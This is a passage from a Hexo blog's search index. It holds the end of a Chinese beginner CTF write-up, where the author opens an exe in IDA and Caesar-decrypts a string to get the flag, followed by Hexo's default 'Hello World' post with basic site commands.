title="二、JustCaesar"></a>二、JustCaesar</h2><p>第二题同样是exe文件，所以通过ida打开这个压缩包<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013701.png"><br>得到一串代码，通过题目提示凯撒，所以进行凯撒解密得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013803.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 新手、网安学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/07/hello-world/"/>
      <url>/2023/01/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new &quot;My New Post&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
